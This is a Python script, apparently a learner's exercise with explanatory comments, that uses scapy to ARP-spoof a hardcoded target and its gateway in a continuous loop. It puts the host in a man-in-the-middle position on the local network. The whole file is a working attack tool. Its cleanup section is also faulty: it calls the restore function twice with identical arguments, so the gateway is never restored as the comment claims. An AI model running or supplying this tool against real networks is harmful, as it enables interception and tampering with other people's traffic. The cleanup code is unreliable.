#!/usr/bin/env python

import scapy.all as scapy
import time


def get_mac(ip):  # get mac of the target using the ip address (ARP)
    arp_request = scapy.ARP(pdst=ip)
    # creating arp_request object with dst_ip=user_input_ip

    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # create a broadcast object to have Ether frame property with dst_mac = ff:ff:ff:ff:ff:ff

    arp_request_broadcast = broadcast / arp_request
    # combine the Ether frame to arp_request to send

    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    dst_mac = get_mac(target_ip)

    # op is 1 by default, meaning a arp request is created by default
    # but we need to create a arp response, so op=2
    # send a packet to victim saying I have router's mac address
    arp_respond = scapy.ARP(op=2, pdst=target_ip, hwdst=dst_mac, psrc=spoof_ip)
    # arp_respond = scapy.ARP(op=2,pdst="victim-ip",hwdst="victim-mac",psrc="Router-ip")
    # hwsrc is automatically put by scapy as my own mac addr

    # print(arp_respond.show())
    # print(arp_respond.summary())
    scapy.send(arp_respond, verbose=False)


# restore the arp table values
def restore(destination_ip, source_ip):
    dst_mac = get_mac(destination_ip)
    src_mac = get_mac(source_ip)
    arp_respond = scapy.ARP(op=2, pdst=destination_ip, hwdst=dst_mac, psrc=source_ip, hwsrc=src_mac)
    # need to specify hwsrc here, not let scapy put it as my own mac addr by default
    scapy.send(arp_respond, verbose=False, count=4)
    # count=4 -> send 4 times to make sure they receive and change values


count = 0
target_ip = "10.0.2.3"
gateway_ip = "10.0.2.1"
# we need to spoof arp continuously as the values may be restored automatically in some time
try:
    while True:
        spoof(target_ip, gateway_ip)
        # telling client i am the router

        spoof(gateway_ip, target_ip)
        # telling router i am the client
        count += 2

        '''backslash r tell python to always print from start  of line'''
        print("\r[+] Packets sent " + str(count), end="")
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[+] Detected CTRL+C Quitting and restoring arp value please wait")
    restore(target_ip, gateway_ip)
    # restoring client
    restore(target_ip, gateway_ip)
    # restoring router
